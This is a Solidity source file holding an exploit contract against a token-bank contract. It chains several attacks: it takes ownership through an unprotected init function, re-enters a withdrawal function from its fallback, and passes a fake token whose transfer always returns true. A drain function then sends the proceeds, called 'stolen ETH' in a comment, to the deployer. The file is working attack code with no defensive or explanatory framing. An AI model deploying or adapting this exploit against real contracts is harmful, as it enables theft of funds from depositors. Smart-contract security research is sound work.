pragma solidity ^0.4.18;

interface ITokenBank {
    function initTokenBank() public;
    function Deposit() public payable;
    function WithdrawToHolder(address _addr, uint _wei) public payable;
    function WitdrawTokenToHolder(address _to, address _token, uint _amount) public;
}

contract MaliciousToken {
    // Fallback always returns true, tricking low-level .call
    function transfer(address, uint256) public returns (bool) {
        return true;
    }
}

contract Exploit {
    ITokenBank public target;
    MaliciousToken public maliciousToken;
    address public owner;
    bool public reentered = false;

    function Exploit(address _target) public {
        target = ITokenBank(_target);
        maliciousToken = new MaliciousToken();
        owner = msg.sender;
    }

    // Step 1: Take over the contract
    function takeOwnership() public {
        target.initTokenBank(); // Becomes the new owner
    }

    // Step 2: Deposit ETH to appear as a valid holder
    function deposit() public payable {
        target.Deposit.value(msg.value)();
    }

    // Step 3: Exploit reentrancy in WithdrawToHolder
    function attack() public {
        target.WithdrawToHolder(address(this), 1 ether);
    }

    // Fallback will be called during reentrant .call
    function() public payable {
        if (!reentered) {
            reentered = true;
            // Reenter to withdraw again
            target.WithdrawToHolder(address(this), 1 ether);
        }
    }

    // Step 4: Call WithdrawToken with malicious token contract
    function exploitTokenDrain() public {
        target.WitdrawTokenToHolder(address(this), address(maliciousToken), 1000);
    }

    // Helper to withdraw stolen ETH
    function drain() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

